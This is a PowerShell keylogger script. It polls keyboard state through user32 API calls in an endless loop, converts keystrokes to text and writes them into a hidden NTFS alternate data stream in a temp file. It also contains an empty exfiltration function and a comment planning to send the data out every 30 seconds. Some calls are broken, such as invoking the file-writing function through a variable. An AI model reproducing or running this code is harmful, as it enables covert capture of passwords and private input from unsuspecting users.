Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$scriptDir = Split-Path -LiteralPath $(if ($PSVersionTable.PSVersion.Major -ge 3) { $PSCommandPath } else { & { $MyInvocation.ScriptName } })

$MAPVK_VK_TO_VSC = 0x00
$MAPVK_VSC_TO_VK = 0x01
$MAPVK_VK_TO_CHAR = 0x02
$MAPVK_VSC_TO_VK_EX = 0x03
$MAPVK_VK_TO_VSC_EX = 0x04

$virtualkc_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
'@

$kbstate_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@

$mapchar_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@

$tounicode_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$foreground_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern IntPtr GetForegroundWindow();
'@

function ExfiltrateData(){

}

function WriteFileStream( $Logdata ){
	$file = "$env:temp\test_keylogger.txt"
	Set-Content -Path $file -Value 'Some Data'
	Add-Content -Path $file -Value $Logdata -Stream 'Metadata'
}

   
try {
    $getKeyState = Add-Type -MemberDefinition $virtualkc_sig -name "Win32GetState" -namespace Win32Functions -passThru
    $getKBState = Add-Type -MemberDefinition $kbstate_sig -name "Win32MyGetKeyboardState" -namespace Win32Functions -passThru
    $getKey = Add-Type -MemberDefinition $mapchar_sig -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
    $getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru
    $getForeground = Add-Type -MemberDefinition $foreground_sig -name "Win32MyGetForeground" -namespace Win32Functions -passThru

	#When stopwatch hits 30 seconds we exfil data
	$stopwatch = [System.Diagnostics.Stopwatch]::StartNew()

	#While loop that handles all keylogging operations
    while ($true){
		#Hold the logging every 40 milliseconds after a cycle completes to handle "strange occurances"
		Start-Sleep -Milliseconds 40
		
        $Keystroke = ""

		#First lines cycle through the keys to see if any of them are down
        for ($char = 1; $char -le 254; $char++){
			$key = $char
            $Keystroke = $getKeyState::GetAsyncKeyState($key)

			#Compare the result of GetAsyncKeyState to determine if a key was pressed (MSDN Docs for value)
            if ($Keystroke -lt 0) {
			   
				#Looking for special keystrokes
                $EnterKey = $getKeyState::GetAsyncKeyState(13)
                $TabKey = $getKeyState::GetAsyncKeyState(9)
                $DeleteKey = $getKeyState::GetAsyncKeyState(46)
                $BackSpaceKey = $getKeyState::GetAsyncKeyState(8)
                $caps_lock = [console]::CapsLock
                
                $scancode = $getKey::MapVirtualKey($key, $MAPVK_VSC_TO_VK_EX)
                $kbstate = New-Object Byte[] 256
                $checkkbstate = $getKBState::GetKeyboardState($kbstate)
				
                $charstring = New-Object -TypeName "System.Text.StringBuilder";
                $unicode_res = $getUnicode::ToUnicode($key, $scancode, $kbstate, $charstring, $charstring.Capacity, 0)
                
                $LogOutput += $charstring.ToString();
                              
                if ($EnterKey)     {$LogOutput += '[ENTER]'}
                if ($TabKey)       {$LogOutput += '[Tab]'}
                if ($DeleteKey)    {$LogOutput += '[Delete]'}
				if ($BackSpaceKey) {$LogOutput += '[Backspace]'}

				if ($unicode_res -gt 0) {
					$WriteFileStream($LogOutput)
                }
				
            }
        }

    }
}
finally {

}